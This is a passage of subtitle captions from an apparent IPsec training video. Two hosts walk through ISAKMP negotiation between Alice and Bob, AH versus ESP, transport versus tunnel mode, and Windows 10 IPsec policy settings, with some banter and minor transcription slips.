just start by telling\neverybody what on the screens.\n\n174\n00:08:57.893 --> 00:09:00.930\n&gt;&gt; Okay.\n&gt;&gt; Okay, we've got Bob and Alice, right,\n\n175\n00:09:00.930 --> 00:09:04.331\nour magical,\nmythical couple of cryptography fame.\n\n176\n00:09:04.331 --> 00:09:06.472\n&gt;&gt; Alice on the left.\n&gt;&gt; Alice on the left, right, and\n\n177\n00:09:06.472 --> 00:09:07.935\nBob's on the right.\n\n178\n00:09:07.935 --> 00:09:09.100\nCuz if Bob was on the left and\n\n179\n00:09:09.100 --> 00:09:10.875\nAlice was on the left we'd\nhave nothing to talk about.\n\n180\n00:09:10.875 --> 00:09:13.310\n&gt;&gt; [LAUGH]\n&gt;&gt; So Alice on the left, Bob on the right.\n\n181\n00:09:13.310 --> 00:09:16.820\nAnd they each have some sort of\na communication device, so a laptop or\n\n182\n00:09:16.820 --> 00:09:18.560\nwhatever it may be,\nit doesn't really matter.\n\n183\n00:09:18.560 --> 00:09:21.321\nRight, it's just that the only shapes\nthat Mike had access to were laptops,\n\n184\n00:09:21.321 --> 00:09:23.541\notherwise it was that or\na Cracker Jack box, one or the other.\n\n185\n00:09:23.541 --> 00:09:24.814\n&gt;&gt; [LAUGH]\n&gt;&gt; And so\n\n186\n00:09:24.814 --> 00:09:28.087\nwe have a couple of routers\nsitting between them, right?\n\n187\n00:09:28.087 --> 00:09:30.843\nSo our cylindrical objects,\nright, with the arrows on top,\n\n188\n00:09:30.843 --> 00:09:32.390\ncrossed arrows are routers.\n\n189\n00:09:32.390 --> 00:09:35.210\nAnd we've got some arrows that\nare just colored lines representing\n\n190\n00:09:35.210 --> 00:09:36.630\ncommunication direction, right?\n\n191\n00:09:36.630 --> 00:09:39.440\nAnd then we've got some boxes\ndown below the routers,\n\n192\n00:09:39.440 --> 00:09:44.720\nthat show us that ISAKMP is being\nimplemented either on Alice's side\n\n193\n00:09:44.720 --> 00:09:47.870\nthrough the ISAKMP session,\nback and forth between her and Bob.\n\n194\n00:09:47.870 --> 00:09:50.220\nSo we're just tagging\nthose session requests and\n\n195\n00:09:50.220 --> 00:09:53.040\ninformation to show what's happening,\nright, back and forth.\n\n196\n00:09:53.040 --> 00:09:55.144\nAnd then we've got some steps\nthat we've laid out for\n\n197\n00:09:55.144 --> 00:09:58.476\nyou to help us just to explain what's\nhappening, right, in each particular step.\n\n198\n00:09:58.476 --> 00:10:01.666\nAll right, so now that we've done that,\nlet's just kind of zoom in a little bit,\n\n199\n00:10:01.666 --> 00:10:02.466\nand that's got it.\n\n200\n00:10:02.466 --> 00:10:06.090\nYou can actually keep it centered\nback just a smidge to the other side.\n\n201\n00:10:06.090 --> 00:10:08.130\n&gt;&gt; Okay.\n&gt;&gt; So we can see all four.\n\n202\n00:10:08.130 --> 00:10:09.440\nNope a little bit more that way, perfect.\n\n203\n00:10:09.440 --> 00:10:10.450\nYeah, right there, that's good.\n\n204\n00:10:10.450 --> 00:10:12.090\nThat way we can more or\nless see what's happening.\n\n205\n00:10:12.090 --> 00:10:14.050\nCan you move the little tool\nbar on the left-hand side?\n\n206\n00:10:14.050 --> 00:10:14.888\nLet's get that out of the way.\n\n207\n00:10:14.888 --> 00:10:17.060\nAnd that way everybody, [CROSSTALK]\n&gt;&gt; It won't go away.\n\n208\n00:10:17.060 --> 00:10:17.698\n&gt;&gt; Park that somewhere.\n\n209\n00:10:17.698 --> 00:10:19.205\n&gt;&gt; You just get it out\nof the way down there.\n\n210\n00:10:19.205 --> 00:10:21.358\n&gt;&gt; Just so they could see what was\nhappening, and that's fine, all right.\n\n211\n00:10:21.358 --> 00:10:25.360\nSo in step 1 over there, the outbound\npackets from Alice to Bob, without the SA,\n\n212\n00:10:25.360 --> 00:10:29.379\nwithout the Security Association,\nbecause we're starting the conversation.\n\n213\n00:10:29.379 --> 00:10:30.714\nWe haven't negotiated yet and\n\n214\n00:10:30.714 --> 00:10:33.770\nwe haven't agreed to how we're\ngonna communicate securely.\n\n215\n00:10:33.770 --> 00:10:36.763\nSo this is essentially unsecured\ncommunication that is starting what is\n\n216\n00:10:36.763 --> 00:10:39.312\ngonna be the set up,\nthat's ultimately gonna lead, right,\n\n217\n00:10:39.312 --> 00:10:42.750\nto the implementation of ISAKMP,\nthat's what we're seeing there.\n\n218\n00:10:42.750 --> 00:10:46.438\nAnd then, was there a specificity in\nyour mind about the color choice?\n\n219\n00:10:46.438 --> 00:10:52.208\nRed being unprotected, danger, and\ngreen being okay and good for protected.\n\n220\n00:10:52.208 --> 00:10:54.909\nAnd blue,\nbecause we didn't have any other color?\n\n221\n00:10:54.909 --> 00:10:57.348\n&gt;&gt; Blue shows up well on\nthe grey background, okay, good.\n\n222\n00:10:57.348 --> 00:11:03.899\nOkay, so no fuschia, no yellow.\n\n223\n00:11:03.899 --> 00:11:04.967\n&gt;&gt; We could go with a nice yellow piece.\n\n224\n00:11:04.967 --> 00:11:08.275\n&gt;&gt; We could have a nice teal maybe,\na little aqua maybe.\n\n225\n00:11:08.275 --> 00:11:09.310\n&gt;&gt; Titus would want some orange in there.\n\n226\n00:11:09.310 --> 00:11:13.926\n&gt;&gt; Orange, I was gonna say, I do have by\nthe way, did you show the orange socks?\n\n227\n00:11:13.926 --> 00:11:15.871\nCan we do the sock thing, sock cam?\n\n228\n00:11:15.871 --> 00:11:17.755\nSock cam, sock cam.\n\n229\n00:11:17.755 --> 00:11:20.250\nCalling, sock cam, wrong cam.\n\n230\n00:11:20.250 --> 00:11:21.700\nWide angle, sock cam.\n\n231\n00:11:21.700 --> 00:11:23.970\nSo orange with yellow.\n\n232\n00:11:23.970 --> 00:11:25.860\nNo gray, actually I have blue,\nbut no green.\n\n233\n00:11:25.860 --> 00:11:28.730\nSo we can't do the ISAKMP thing,\nand I'm about fall over.\n\n234\n00:11:28.730 --> 00:11:30.250\nSo that's about the extent\nof the sock cam,\n\n235\n00:11:30.250 --> 00:11:31.690\nbut you could see that\nwe do have that there.\n\n236\n00:11:31.690 --> 00:11:33.730\nSo no orange, that was horrible.\n\n237\n00:11:33.730 --> 00:11:38.010\nSo you didn't do the right color\nselection, just like kinda winged it.\n\n238\n00:11:38.010 --> 00:11:39.099\n&gt;&gt; I know.\nIt was squeezed in.\n\n239\n00:11:39.099 --> 00:11:40.518\n&gt;&gt; All right,\nwe're gonna move that out of the way.\n\n240\n00:11:40.518 --> 00:11:43.932\n&gt;&gt; Now you're trying to change the-\n&gt;&gt; I was trying to get it done while\n\n241\n00:11:43.932 --> 00:11:44.920\nyou're in here.\n\n242\n00:11:44.920 --> 00:11:47.180\n&gt;&gt; So you see,\nyou're gonna go in there and you're gonna-\n\n243\n00:11:47.180 --> 00:11:48.210\n&gt;&gt; But that didn't work out too well.\n\n244\n00:11:48.210 --> 00:11:49.240\n&gt;&gt; No, I guess not.\n\n245\n00:11:49.240 --> 00:11:49.951\nWell, that's okay.\n\n246\n00:11:49.951 --> 00:11:52.990\nIf it makes Titus feel better,\nyou put orange in there, I'm all for that.\n\n247\n00:11:52.990 --> 00:11:53.900\n&gt;&gt; Yes, there we go.\n\n248\n00:11:53.900 --> 00:11:55.660\n&gt;&gt; That's fine, you got that up there?\n\n249\n00:11:55.660 --> 00:11:58.395\nAll right, so now he's feeling like\na million bucks now, all right?\n\n250\n00:11:58.395 --> 00:12:01.170\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, so that's what's important.\n\n251\n00:12:01.170 --> 00:12:02.930\n&gt;&gt; That right there,\nthat's what's important.\n\n252\n00:12:02.930 --> 00:12:06.491\n&gt;&gt; All right, so let's go in and\n\n253\n00:12:06.491 --> 00:12:10.914\nlet's talk about what we got there.\n\n254\n00:12:10.914 --> 00:12:13.494\n&gt;&gt; Can we move, yeah I was gonna say move\nthe big white box that's in the middle of\n\n255\n00:12:13.494 --> 00:12:14.101\nthe thing there.\n\n256\n00:12:14.101 --> 00:12:14.719\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n257\n00:12:14.719 --> 00:12:18.740\nwe outbound the packets from\nAlice over to Bob without the SA.\n\n258\n00:12:18.740 --> 00:12:20.860\nRight, step one, upper left-hand corner.\n\n259\n00:12:20.860 --> 00:12:22.760\nStep two, lower left-hand corner.\n\n260\n00:12:22.760 --> 00:12:25.570\nAlice's exchange with ISAKMP\n\n261\n00:12:25.570 --> 00:12:29.930\nis gonna begin to negotiate\nwith Bob's ISAKMP exchange.\n\n262\n00:12:29.930 --> 00:12:34.680\nThat's gonna be the bottom reference back\nand forth with the blue, the white, and\n\n263\n00:12:34.680 --> 00:12:36.090\nnow orange arrows.\n\n264\n00:12:36.090 --> 00:12:40.563\nAnd so we're gonna start the negotiation\nprocess to establish the secure\n\n265\n00:12:40.563 --> 00:12:44.532\ncommunication channel that is\nnegotiated as a set of two one-way\n\n266\n00:12:44.532 --> 00:12:48.156\nexchanges known as SAs or\nSecurity Associations, right.\n\n267\n00:12:48.156 --> 00:12:51.961\nSo we're going to start that process, so\nthat's what's happening with that backing\n\n268\n00:12:51.961 --> 00:12:55.346\nand forthing of the traffic, and the\narrows up and down through the router and\n\n269\n00:12:55.346 --> 00:12:58.610\nultimately cross back and\nforth through the ISAKMP session.\n\n270\n00:12:58.610 --> 00:13:03.400\nAnd then on the right-hand side,\nlower right, step 3,\n\n271\n00:13:03.400 --> 00:13:04.440\nnegotiation is taking place.\n\n272\n00:13:04.440 --> 00:13:06.530\nSo we've got that back and forth.\n\n273\n00:13:06.530 --> 00:13:08.600\nNegotiation is complete ultimately.\n\n274\n00:13:08.600 --> 00:13:11.590\nAlice and Bob now have their IKE and\nIPsec SAs in place.\n\n275\n00:13:11.590 --> 00:13:14.874\nSo essentially now we've got\na secure communication agreement,\n\n276\n00:13:14.874 --> 00:13:18.451\ntwo SAs operating uni-directionally but\njointly combined together,\n\n277\n00:13:18.451 --> 00:13:20.337\nkinda like the wonder twins, right?\n\n278\n00:13:20.337 --> 00:13:20.880\n&gt;&gt; Yes.\n\n279\n00:13:20.880 --> 00:13:22.483\n&gt;&gt; Power activate, shape up, right?\n\n280\n00:13:22.483 --> 00:13:24.023\n&gt;&gt; Or [INAUDIBLE]\n&gt;&gt; Yeah, exactly.\n\n281\n00:13:24.023 --> 00:13:24.620\n&gt;&gt; Bucket of water.\n\n282\n00:13:24.620 --> 00:13:27.360\n&gt;&gt; Yeah, exactly, and so\nwe got the bucket of water,\n\n283\n00:13:27.360 --> 00:13:30.030\nwe've got whatever we need there.\n\n284\n00:13:30.030 --> 00:13:33.620\nAnd so now we're gonna be able\nto start communicating securely.\n\n285\n00:13:33.620 --> 00:13:36.049\nAnd so in step 4, upper right-hand side,\n\n286\n00:13:36.049 --> 00:13:39.278\nwe see packet is sent from Alice\nto Bob protected by IPsec.\n\n287\n00:13:39.278 --> 00:13:42.455\nAnd we don't really have the arrow\ngoing back and forth for direction, but\n\n288\n00:13:42.455 --> 00:13:44.480\nthe idea is the packets would go back and\nforth.\n\n289\n00:13:44.480 --> 00:13:45.800\nThey would be secure.\n\n290\n00:13:45.800 --> 00:13:49.835\nSo [COUGH] when when we think about IPsec,\nthat's good.\n\n291\n00:13:49.835 --> 00:13:51.583\nWhen we think about IPsec,\n\n292\n00:13:51.583 --> 00:13:56.600\nwe're thinking about the implementation\nof a security solution that is going\n\n293\n00:13:56.600 --> 00:14:02.314\nto overlay the basic traffic transmission\nallowing us to authenticate, potentially.\n\n294\n00:14:02.314 --> 00:14:04.010\nWe're gonna take a look\nat this in a minute.\n\n295\n00:14:04.010 --> 00:14:06.400\nTo potentially authenticate,\ndepends on how we set this up.\n\n296\n00:14:06.400 --> 00:14:10.520\nTo potentially encrypt, depending again\non how we set this up, to do either or\n\n297\n00:14:10.520 --> 00:14:13.660\nboth, depending on the nature\nof the configuration.\n\n298\n00:14:13.660 --> 00:14:17.690\nAnd if we do everything correctly\nto set up authentication and\n\n299\n00:14:17.690 --> 00:14:20.930\nencryption between the sender and\nthe receiver.\n\n300\n00:14:20.930 --> 00:14:23.040\nNow we can do IPsec in one of two modes,\nright?\n\n301\n00:14:23.040 --> 00:14:24.390\nWe can do this in either?\n\n302\n00:14:24.390 --> 00:14:25.470\n&gt;&gt; Authentication Header Mode,\n\n303\n00:14:25.470 --> 00:14:28.000\nwhere we're just doing integrity\n&gt;&gt; Right.\n\n304\n00:14:28.000 --> 00:14:30.115\n&gt;&gt; Or\nwe can do Encapsulated Script Payload,\n\n305\n00:14:30.115 --> 00:14:33.902\nwhere we're actually encrypting the data\nas well as providing integrity.\n\n306\n00:14:33.902 --> 00:14:34.660\n&gt;&gt; We could actually do both.\n\n307\n00:14:34.660 --> 00:14:36.680\nSo we could do authentication and\n\n308\n00:14:36.680 --> 00:14:39.720\nencryption all together or\nwe could focus just on that.\n\n309\n00:14:39.720 --> 00:14:40.398\nAnd we can make sure and\n\n310\n00:14:40.398 --> 00:14:42.523\nwe're actually gonna take a look cuz\nI know you have that set up for us.\n\n311\n00:14:42.523 --> 00:14:44.118\nSo what are we gonna,\nwhoa, hey, look at that.\n\n312\n00:14:44.118 --> 00:14:46.450\nWhoa, okay.\n\n313\n00:14:46.450 --> 00:14:47.070\nBobbing out.\n\n314\n00:14:47.070 --> 00:14:50.210\nIt's having a crazy time at\nthe IPsec forum tonight, all right.\n\n315\n00:14:50.210 --> 00:14:52.510\nSo as soon as Mike figures\nout how not to zoom in and\n\n316\n00:14:52.510 --> 00:14:53.720\nout [LAUGH] while we're changing.\n\n317\n00:14:53.720 --> 00:14:55.090\nWe're gonna go ahead and\nwe're gonna switch over.\n\n318\n00:14:55.090 --> 00:14:58.600\nMike has another graphic for us,\nactually two we're gonna take a look at.\n\n319\n00:14:58.600 --> 00:15:02.930\nAnd he has put up, I believe, one for age\nand one for encapsulated security payload.\n\n320\n00:15:02.930 --> 00:15:04.370\nSo we're gonna take a look at that.\n\n321\n00:15:04.370 --> 00:15:06.830\nIn the meantime,\njust while Mike's setting up.\n\n322\n00:15:06.830 --> 00:15:08.380\nCan you go over to my machine for\njust a second?\n\n323\n00:15:08.380 --> 00:15:10.300\nI just wanna show everybody\nsomething real quick.\n\n324\n00:15:10.300 --> 00:15:14.651\nSo on my machine, we often talk\nabout how do we set up IPsec and\n\n325\n00:15:14.651 --> 00:15:17.710\nyou saw us generically\nkind of diagram it out.\n\n326\n00:15:17.710 --> 00:15:19.360\nThis is a Windows 10 machine.\n\n327\n00:15:19.360 --> 00:15:21.844\nSo this is our base machine that\nI often do the labs off of but\n\n328\n00:15:21.844 --> 00:15:24.510\nwe're usually remoting in,\nright, to different systems.\n\n329\n00:15:24.510 --> 00:15:28.490\nSo I thought it would just be nice just\nto show you what a basic construct looks\n\n330\n00:15:28.490 --> 00:15:29.310\nlike here.\n\n331\n00:15:29.310 --> 00:15:30.120\nI'm on Windows 10.\n\n332\n00:15:30.120 --> 00:15:32.200\nI'm just in the local security policy.\n\n333\n00:15:32.200 --> 00:15:34.700\nSo I'm in the admin tools,\nwent to the Control Panel,\n\n334\n00:15:34.700 --> 00:15:38.480\nopened up the local security policy,\nsecurity settings area.\n\n335\n00:15:38.480 --> 00:15:41.750\nI went to IP Security Policies\non Local Computer on the left.\n\n336\n00:15:41.750 --> 00:15:45.840\nAnd what I've got is, I'm just looking at\nand I've created a new IP Security policy.\n\n337\n00:15:45.840 --> 00:15:48.231\nAnd what I've got now is\njust the basic construct,\n\n338\n00:15:48.231 --> 00:15:50.015\nthe beginning of the IPsec solution.\n\n339\n00:15:50.015 --> 00:15:52.491\nSo I thought I would just\nquickly bring this up, and\n\n340\n00:15:52.491 --> 00:15:54.633\njust show you what we're about to discuss.\n\n341\n00:15:54.633 --> 00:15:55.806\nLet me actually do it this way.\n\n342\n00:15:55.806 --> 00:15:57.537\nJust move this over a little bit, so\n\n343\n00:15:57.537 --> 00:16:01.286\nthat I can have both up on the screen at\nthe same time, and I can move them over so\n\n344\n00:16:01.286 --> 00:16:04.804\nyou can see it, and so when we do this\nwhat we're gonna take a look at, and\n\n345\n00:16:04.804 --> 00:16:07.631\nwe're gonna show you is the ability\nto be able to go in, and\n\n346\n00:16:07.631 --> 00:16:10.700\nto take a look at either\nthe authentication header exchange.\n\n347\n00:16:10.700 --> 00:16:15.814\nAnd what age does is it allows us as Mike\nwas saying to do the authentication and\n\n348\n00:16:15.814 --> 00:16:18.343\nto provide the integrity mechanism.\n\n349\n00:16:18.343 --> 00:16:21.883\nSo that we can validate who's on\nthe other end of this communication, and\n\n350\n00:16:21.883 --> 00:16:25.500\nthat the information has not been\nmodified or in any way compromised.\n\n351\n00:16:25.500 --> 00:16:27.610\nAnd if we do encapsulated\nsecurity payload,\n\n352\n00:16:27.610 --> 00:16:31.060\nwhat we're gonna do is we're going\nto be able to do encryption.\n\n353\n00:16:31.060 --> 00:16:34.633\nBut a lot of people don't realize and know\nthat we actually can do authentication and\n\n354\n00:16:34.633 --> 00:16:36.508\nencryption together, and so we have both.\n\n355\n00:16:36.508 --> 00:16:39.548\nSo we're gonna take a look, and we'll show\nyou a diagram on this in a minute, but\n\n356\n00:16:39.548 --> 00:16:42.350\nsince we're here I thought it would\njust be cool to actually look at this.\n\n357\n00:16:42.350 --> 00:16:46.514\nSo I'm gonna go ahead and I'm going\nto just highlight this first one,\n\n358\n00:16:46.514 --> 00:16:49.069\nlet's just edit this and what we'll see.\n\n359\n00:16:49.069 --> 00:16:52.100\nAnd I'll just move it over so\nwe can kind of stack it up going this way.\n\n360\n00:16:52.100 --> 00:16:53.860\nRight, you will see we have integrated and\n\n361\n00:16:53.860 --> 00:16:57.860\nencryption as Mike was describing\nusing encapsulating security payload.\n\n362\n00:16:57.860 --> 00:17:01.980\nNow we can use triple for instance as\nan algorithm that may be used here.\n\n363\n00:17:01.980 --> 00:17:03.670\nWe could do integrity only.\n\n364\n00:17:03.670 --> 00:17:07.400\nIntegrity only will be AHHR authentication\nheader or we can do custom and\n\n365\n00:17:07.400 --> 00:17:12.980\ncustom allows me to go in to settings and\nallows me, put that one front and\n\n366\n00:17:12.980 --> 00:17:15.940\ncenter there,\nto decide how I wanna implement this.\n\n367\n00:17:15.940 --> 00:17:20.800\nI can do data and add data, and\nexcuse me, integrity without encryption,\n\n368\n00:17:20.800 --> 00:17:24.560\nso this will be the authentication header.\n\n369\n00:17:24.560 --> 00:17:27.204\nAnd I could pull down and\nI could choose my integrity algorithm.\n\n370\n00:17:27.204 --> 00:17:30.116\nRight, my hashing algorithm,\neither shy1 or md5.\n\n371\n00:17:30.116 --> 00:17:31.760\nSo we could do that.\n\n372\n00:17:31.760 --> 00:17:35.810\nOr I can, if I just unselect there,\nI can go ahead and do data integrity and\n\n373\n00:17:35.810 --> 00:17:38.370\nencryption with encapsulating\nsecurity payload ESP.\n\n374\n00:17:38.370 --> 00:17:41.640\nI've got again my algorithm, md5, shy1.\n\n375\n00:17:41.640 --> 00:17:45.767\nAnd for my encryption algorithms,\nI have triple and or I have and or I\n\n376\n00:17:45.767 --> 00:17:49.990\nhave an option to do a none, right, cuz I\ncan decide I don't want one or the other.\n\n377\n00:17:49.990 --> 00:17:51.340\nSo I can do that.\n\n378\n00:17:51.340 --> 00:17:53.880\nAnd then I can go in and\nI can do things like tell me\n\n379\n00:17:53.880 --> 00:17:57.500\nhow often I wanna generate a new key,\nhow many packets, that kind of thing.\n\n380\n00:17:57.500 --> 00:18:00.990\nOr how many kilobytes of data, rather,\nand then generate a new key every so\n\n381\n00:18:00.990 --> 00:18:01.660\nmany seconds.\n\n382\n00:18:01.660 --> 00:18:03.080\nI could do that different ways.\n\n383\n00:18:03.080 --> 00:18:05.650\nSo I have the option here\nto be able to set this up.\n\n384\n00:18:05.650 --> 00:18:08.842\nAnd I can go in and I can stack these\nup and make the decision about how\n\n385\n00:18:08.842 --> 00:18:12.216\nI actually want to interact with this,\nso it's kind of interesting.\n\n386\n00:18:12.216 --> 00:18:13.787\n&gt;&gt; Mm-hm, it is.\n\n387\n00:18:13.787 --> 00:18:16.260\n&gt;&gt; Yep, okay, so let's go back, let's\nactually take a look at the graphics.\n\n388\n00:18:16.260 --> 00:18:17.800\nWe'll leave that alone over there for\na minute.\n\n389\n00:18:17.800 --> 00:18:20.440\nI know it's a little bit sometimes\nhard to see on the screen but\n\n390\n00:18:20.440 --> 00:18:23.370\nI know when we put the graphics up\nbecause they are colorful lot easier\n\n391\n00:18:23.370 --> 00:18:24.870\nto watch the flow and interact with it.\n\n392\n00:18:24.870 --> 00:18:28.130\nSo you just saw what we would do\nin a real machine to set it up.\n\n393\n00:18:28.130 --> 00:18:31.519\nLet's just take a look at how we diagram\nit out to theoretically respond or\n\n394\n00:18:31.519 --> 00:18:32.949\nshow you what this would like.\n\n395\n00:18:32.949 --> 00:18:37.941\nSo with authentication header, remember\nintegrity only so we're simply focusing\n\n396\n00:18:37.941 --> 00:18:42.310\non hashing and validating the authenticity\nof the data and the end point.\n\n397\n00:18:42.310 --> 00:18:45.690\nWe're not looking at whether or\nnot this is encapsulated and\n\n398\n00:18:45.690 --> 00:18:48.880\ntherefore whether it's gonna be\nencrypt it's just gonna be integrity.\n\n399\n00:18:48.880 --> 00:18:50.310\nSo we have the IP header there.\n\n400\n00:18:50.310 --> 00:18:52.019\nWe have the data pay load,\n\n401\n00:18:52.019 --> 00:18:57.086\nwe're adding in the integrity algorithm\nthe H mac with either MD5 or SHI1.\n\n402\n00:18:57.086 --> 00:18:59.205\nWe do MD5 up there I think.\n\n403\n00:18:59.205 --> 00:19:02.009\nAnd so then we have our H header,\nand so as a result,\n\n404\n00:19:02.009 --> 00:19:04.750\nthe Header is now appended\nto the IP Header, and\n\n405\n00:19:04.750 --> 00:19:08.890\nthe data payload right on the traffic\nis moving through the router.\n\n406\n00:19:08.890 --> 00:19:11.750\nAnd because of that,\nwe now have the ability to be able to\n\n407\n00:19:11.750 --> 00:19:14.780\nvalidate the information when it\nis received on the other side.\n\n408\n00:19:14.780 --> 00:19:16.965\nRight, so this is what it would\nlook like as it goes through.\n\n409\n00:19:16.965 --> 00:19:18.300\nAnd we can then do the same thing,\n\n410\n00:19:18.300 --> 00:19:21.225\nI think we have encapsulated security\npayload on the other one, right?\n\n411\n00:19:21.225 --> 00:19:25.252\nSo with this one with ESP we have\nthe IP header and the data payload.\n\n412\n00:19:25.252 --> 00:19:29.789\nWe're adding triple for instance,\nright as our encrypting algorithm for\n\n413\n00:19:29.789 --> 00:19:33.270\napplying the cryptographic\nprotection up top in fuchsia.\n\n414\n00:19:33.270 --> 00:19:34.950\nRight?\nOr whatever color we're gonna call that.\n\n415\n00:19:34.950 --> 00:19:35.930\n&gt;&gt; We'll give credit to Ronnie.\n\n416\n00:19:35.930 --> 00:19:37.850\nHe was the creative mind behind this one.\n\n417\n00:19:37.850 --> 00:19:39.289\n&gt;&gt; Okay.\nSo he obviously has a wider color\n\n418\n00:19:39.289 --> 00:19:40.088\npalette than you do.\n\n419\n00:19:40.088 --> 00:19:41.198\n&gt;&gt; [LAUGH] Yeah.\n&gt;&gt; So good to know.\n\n420\n00:19:41.198 --> 00:19:43.175\n&gt;&gt; He's more brave with his colors.\n\n421\n00:19:43.175 --> 00:19:46.173\n&gt;&gt; Gonna have to start working with him\nto do some of my graphic layouts as\n\n422\n00:19:46.173 --> 00:19:49.480\nopposed to Mr. Red and Green that is\nthe extent of what we have there.\n\n423\n00:19:49.480 --> 00:19:51.098\nBut you're good for\nChristmas though right?\n\n424\n00:19:51.098 --> 00:19:52.157\n&gt;&gt; Yeah.\n&gt;&gt; [CROSSTALK] So around Christmas time\n\n425\n00:19:52.157 --> 00:19:53.440\nyou're like the man for\nthe holiday season.\n\n426\n00:19:53.440 --> 00:19:54.090\nRight?\n\n427\n00:19:54.090 --> 00:19:56.562\nAll right.\nSo then we have the SP in transport mode.\n\n428\n00:19:56.562 --> 00:19:57.860\nWe'll talk about transport and\ntunnel mode.\n\n429\n00:19:57.860 --> 00:19:59.078\nWe haven't talked about those yet.\n\n430\n00:19:59.078 --> 00:20:01.120\nWe'll talk about that in just a minute.\n\n431\n00:20:01.120 --> 00:20:05.110\nBut we have the IP header with\nthe SP added there as you can see.\n\n432\n00:20:05.110 --> 00:20:09.790\nAnd as a result of that we are now\nencapsulating and encrypting the data but\n\n433\n00:20:09.790 --> 00:20:12.420\nwe also can provide\nauthentication as part of that.\n\n434\n00:20:12.420 --> 00:20:16.590\nYou see the ESP authentication details or\nthe authentication information\n\n435\n00:20:16.590 --> 00:20:19.760\noff to the extreme right hand\nside right out to the edge there.\n\n436\n00:20:19.760 --> 00:20:22.380\nAnd so let's talk about\ntunnel versus transport mode.\n\n437\n00:20:22.380 --> 00:20:28.280\nSo when we think about setting up IP Sec\nwe can do this in one of two ways.\n\n438\n00:20:28.280 --> 00:20:30.760\nAside from obviously you\nknow using encryption and or\n\n439\n00:20:30.760 --> 00:20:32.260\nauthentication, one or both.\n\n440\n00:20:32.260 --> 00:20:35.390\nBut we can also decide whether\nwe're gonna use transport mode.\n\n441\n00:20:35.390 --> 00:20:39.550\nAnd what I often think about when I try to\nremember this is, we transport on the LAN,\n\n442\n00:20:39.550 --> 00:20:40.580\nwe tunnel through the WIN.\n\n443\n00:20:40.580 --> 00:20:43.540\nI don't know if that works for everybody,\nand that may or may not work for you,\n\n444\n00:20:43.540 --> 00:20:45.520\nbut you would transport mode,\n\n445\n00:20:45.520 --> 00:20:48.370\nwe're transporting up to the LAN\nside of the gateway device.\n\n446\n00:20:48.370 --> 00:20:52.620\nSo between machines on the LAN\nwe do this in transport mode,\n\n447\n00:20:52.620 --> 00:20:54.550\nup to the router to interface the gateway.\n\n448\n00:20:54.550 --> 00:20:57.540\nWe transport across the gateway interface,\n\n449\n00:20:57.540 --> 00:21:00.730\nbetween routers traditionally\nas our gateways.\n\n450\n00:21:00.730 --> 00:21:05.210\nOn the WAN we are tunneling, we tunnel\nbetween routers, we transport on the LAN.\n\n451\n00:21:05.210 --> 00:21:06.690\nSo if you remember that,\n\n452\n00:21:06.690 --> 00:21:10.854\nyou'll always know what mode of IP\nsec we are operating with, right?\n\n453\n00:21:10.854 --> 00:21:12.790\nSo we want to keep that in mind, as well.\n\n454\n00:21:12.790 --> 00:21:17.285\nSo make sure as we're talking about this,\nthat you have a sense of not\n\n455\n00:21:17.285 --> 00:21:22.095\njust authentication headers versus\nencapsulating security payload but\n\n456\n00:21:22.095 --> 00:21:26.069\nalso transport mode versus\ntunnel mode with regards to ESP.\n\n457\n00:21:26.069 --> 00:21:27.835\nWe wanna make sure we\nhave a sense of both and\n\n458\n00:21:27.835 --> 00:21:30.548\nobviously we want to make sure\nthat we are comfortable with both.\n\n459\n00:21:30.548 --> 00:21:33.883\nRemember IP sec is essentially\na protocol suite that's developed\n\n460\n00:21:33.883 --> 00:21:36.919\na secure IP communications\nthrough both authentication and\n\n461\n00:21:36.919 --> 00:21:40.506\nencryption of all the IP packets that\nare transmitting back and forth.\n\n462\n00:21:40.506 --> 00:21:42.444\nWe use it with as we said L2TP,\n\n463\n00:21:42.444 --> 00:21:46.184\nVPN's are gonna be one of\nthe primary beneficiaries of it.\n\n464\n00:21:46.184 --> 00:21:49.099\nWe just want to make sure we're\ncomfortable with that and\n\n465\n00:21:49.099 --> 00:21:50.320\nwe have a sense of that.\n\n466\n00:21:50.320 --> 00:21:53.947\nSo when we think about IPsec we think\nabout authentication and confidentiality.\n\n467\n00:21:53.947 --> 00:21:56.170\nWe were discussing in the diagrams.\n\n468\n00:21:56.170 --> 00:21:57.620\nAnd we showed you for instance.\n\n469\n00:21:57.620 --> 00:22:00.600\nIn the demo,\nthe little screen there on Windows 10.\n\n470\n00:22:00.600 --> 00:22:02.680\nWe always wanna be thinking\nabout what we're looking to do.\n\n471\n00:22:02.680 --> 00:22:06.110\nNow smart administrators\nwill simply set up IP SEC\n\n472\n00:22:06.110 --> 00:22:08.930\nwith encapsulated security payload and\ndo both at once,\n\n473\n00:22:08.930 --> 00:22:12.210\nwhy do twice the work when you\ngotta do authentication separately.\n\n474\n00:22:12.210 --> 00:22:13.670\nYou could do them together, and\n\n475\n00:22:13.670 --> 00:22:15.210\na lot of people don't realize that or\nremember that.\n\n476\n00:22:15.210 --> 00:22:17.730\nSo I'd just like to call that out and\nmake sure you know that, but for\n\n477\n00:22:17.730 --> 00:22:20.910\npurposes of the exam, you do want\nto make sure you understand that\n\n478\n00:22:20.910 --> 00:22:24.470\nwe can differentiate, we do want to\nunderstand we could do one or both.\n\n479\n00:22:24.470 --> 00:22:29.230\nAnd there's nothing wrong with\nsetting up on ESP to do both.\n\n480\n00:22:29.230 --> 00:22:32.010\nBut you just want to always understand\nyou have the option of bolting on\n\n481\n00:22:33.150 --> 00:22:37.080\nAs an additional authentication solution\nif we choose to break them out separately.\n\n482\n00:22:37.080 --> 00:22:40.260\nThe reason, primary reason quite honestly\nwe break them out separately is from\n\n483\n00:22:40.260 --> 00:22:42.580\nan auditability standpoint,\ntraceability and logs.\n\n484\n00:22:42.580 --> 00:22:46.040\nWe can see different traffic flowing and\nunderstand each set up.\n\n485\n00:22:46.040 --> 00:22:48.230\nIf we do it all together while\nwe can differentiate it,\n\n486\n00:22:48.230 --> 00:22:50.192\nit's harder sometimes\nto understand all that.\n\n487\n00:22:50.192 --> 00:22:52.280\nSo it's just something to,\nyou know, just think about.\n\n488\n00:22:52.280 --> 00:22:54.511\nWhen you set it up do you\noften have a preference?\n\n489\n00:22:54.511 --> 00:22:56.588\n&gt;&gt; You know it really [CROSSTALK],\nkind of like you were saying,\n\n490\n00:22:56.588 --> 00:22:57.577\ndepends on what I'm doing.\n\n491\n00:22:57.577 --> 00:22:59.677\nIf I've got a scenario where I've got a,\n\n492\n00:22:59.677 --> 00:23:02.437\nmaybe I've got a tunnel\nalready built between corp 